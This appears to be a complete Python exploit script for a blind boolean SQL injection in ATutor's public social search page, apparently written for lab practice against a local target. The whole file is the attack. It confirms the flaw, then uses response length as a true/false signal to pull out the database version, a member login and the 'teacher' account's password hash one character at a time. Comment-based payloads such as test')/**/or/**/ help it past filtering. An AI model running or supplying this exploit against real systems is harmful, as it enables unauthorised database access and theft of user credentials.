import sys
import re
import requests
from bs4 import BeautifulSoup


protocol    = "http://"
path        = "/ATutor/mods/_standard/social/index_public.php"
query       = "?q="

def searchFriends_bsqli(host, query_type, inj_query, expected_data_len):
    
    extracted_data = ""
    print("[+] Extracting %s ..." % query_type)
    
    for i in range(1, expected_data_len + 1):
        
        #template = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj_query, i)
        template = "test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23" % (inj_query, i)
        
        # printable asci set
        first = 32
        last = 126
        extracted_char = None
        for j in range(first, last):

            payload = template.replace("[CHAR]",  str(j))            
            target = "%s%s%s%s%s" % (protocol, host, path, query, payload)
            r = requests.get(target)
            
            # content_length is the TRUE/FALSE indicator
            content_length = int(r.headers['Content-Length'])
            if (content_length > 20):
                extracted_char = chr(j)
                extracted_data += extracted_char
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                break

        if not extracted_char:            
            break
        
    print("\n[+] %s: %s" % (query_type, extracted_data))
    print("[+] Done!")
    
    return extracted_data
        
def searchFriends_bsqli_test(host, false_payload, true_payload):
    
    payloads = {false_payload: False, true_payload: True}
    
    response = []
    for payload, query_type in payloads.items():
    
        target = "%s%s%s%s%s" % (protocol, host, path, query, payload)
        
        r = requests.get(target)
        
        # content_length is the TRUE/FALSE indicator
        content_length = int(r.headers['Content-Length'])
        if (query_type==False) and (content_length == 20):
            response.append(True)
        elif (query_type==True) and (content_length > 20):
            response.append(True)
        else:
            response.append(False)

    # Check if both are True
    if len(response)==2 and len(set(response))==1 and response[0]==True:
        print("[+] Target is vulnerable to blind boolean sqli!")
    else:
        print("[-] Target is NOT vulnerable to blind boolean sqli!")
        
def searchFriends_bsqli_debug(host):
    
    payload = "aaaa\'"

    target = "%s%s%s%s%s" % (protocol, host, path, query, payload)
    
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')

    print("[?] Response Headers:")
    print(r.headers)
    
    print("[?] Response Content:")
    print(s.text)
    
    error = re.search("Invalid argument", s.text)
    if error:
        # Erros message is only shown, if display_errors PHP directive is being set to On.
        print("[+] Errors found in response. Potential SQL injection")
    else:
        print("[-] No errors found. No vulnerability.")

def main():
    if len(sys.argv) != 3:
        print("[!] usage: %s <target> <payload_type>" % sys.argv[0])
        print('[!] eg: python %s atutor.local debug/test/db_version/username/password_hash' % sys.argv[0])
        sys.exit(-1)

    host = sys.argv[1]
    payload_type = sys.argv[2]
    
    # debug
    if (payload_type == "debug"):
        searchFriends_bsqli_debug(host)
        
    # test
    elif (payload_type == "test"):
        false_payload = "test')/**/or/**/(select/**/1)=0%23"
        true_payload  = "test')/**/or/**/(select/**/1)=1%23"
        searchFriends_bsqli_test(host, false_payload, true_payload)

    # db_version: Length of db version() response can be extracted as well
    elif (payload_type == "db_version"):
        query_dbver = "select/**/version()"
        len_version = 20
        searchFriends_bsqli(host, payload_type, query_dbver, len_version)
        
    elif (payload_type == "username"):
        query_username = "select/**/login/**/from/**/AT_members/**/limit/**/1,2"
        len_username = 30
        username = searchFriends_bsqli(host, payload_type, query_username, len_username)

    elif (payload_type == "password_hash"):
        query_password = "select/**/password/**/from/**/AT_members/**/where/**/login='teacher'"
        len_password = 50
        pwd_hash = searchFriends_bsqli(host, payload_type, query_password, len_password)
        

if __name__ == "__main__":
    main()
